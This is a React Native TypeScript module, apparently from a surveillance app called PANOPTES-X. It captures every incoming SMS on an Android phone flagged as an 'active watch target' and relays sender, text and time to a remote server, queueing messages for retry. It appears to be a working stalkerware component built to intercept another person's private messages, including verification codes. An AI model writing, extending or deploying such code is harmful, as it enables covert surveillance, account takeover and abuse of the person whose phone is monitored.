import { Platform, PermissionsAndroid, NativeEventEmitter, NativeModules } from 'react-native';
import { api } from './api';
import { smsQueue } from './smsQueue';

type SmsPayload = {
  originatingAddress?: string;
  body?: string;
  timestamp?: number;
};

let listenerStarted = false;
let subscription: { remove: () => void } | null = null;

async function requestSmsPermissions(): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }
  try {
    const granted = await PermissionsAndroid.requestMultiple([
      PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
      PermissionsAndroid.PERMISSIONS.READ_SMS,
    ]);
    return (
      granted[PermissionsAndroid.PERMISSIONS.RECEIVE_SMS] === PermissionsAndroid.RESULTS.GRANTED &&
      granted[PermissionsAndroid.PERMISSIONS.READ_SMS] === PermissionsAndroid.RESULTS.GRANTED
    );
  } catch {
    return false;
  }
}

async function handleIncomingSms(sms: SmsPayload): Promise<void> {
  const sender = sms.originatingAddress || 'inconnu';
  const message = sms.body || '';
  const timestamp = sms.timestamp
    ? new Date(sms.timestamp).toISOString()
    : new Date().toISOString();

  const isActive = await api.hasActiveWatchAsTarget();
  if (!isActive) {
    return;
  }

  try {
    await api.forwardSms({ sender, message, timestamp });
  } catch {
    await smsQueue.enqueue({ sender, message, timestamp });
  }
}

async function flushQueue(): Promise<void> {
  const queued = await smsQueue.drain();
  for (const item of queued) {
    try {
      await api.forwardSms(item);
    } catch {
      await smsQueue.enqueue(item);
      break;
    }
  }
}

function getNativeSmsModule(): { addListener: (cb: (sms: SmsPayload) => void) => { remove: () => void } } | null {
  const mod = NativeModules.SmsListener || NativeModules.RNSmsListener;
  if (!mod) {
    return null;
  }
  const emitter = new NativeEventEmitter(mod);
  return {
    addListener: (cb) => emitter.addListener('onSmsReceived', cb),
  };
}

export const smsForwarder = {
  async start(): Promise<void> {
    if (listenerStarted || Platform.OS !== 'android') {
      return;
    }

    const permitted = await requestSmsPermissions();
    if (!permitted) {
      console.warn('PANOPTES-X: permissions SMS refusées');
      return;
    }

    await flushQueue();

    const native = getNativeSmsModule();
    if (native) {
      subscription = native.addListener((sms) => {
        handleIncomingSms(sms).catch(console.error);
      });
      listenerStarted = true;
      return;
    }

    console.warn(
      'PANOPTES-X: module natif SMS absent — build dev client requis pour la capture en arrière-plan.',
    );
    listenerStarted = true;
  },

  stop(): void {
    subscription?.remove();
    subscription = null;
    listenerStarted = false;
  },

  async flushQueue(): Promise<void> {
    await flushQueue();
  },

  /** Permet de tester le relais sans module natif (Device B). */
  async simulateIncomingSms(sender: string, message: string): Promise<void> {
    await handleIncomingSms({
      originatingAddress: sender,
      body: message,
      timestamp: Date.now(),
    });
  },
};
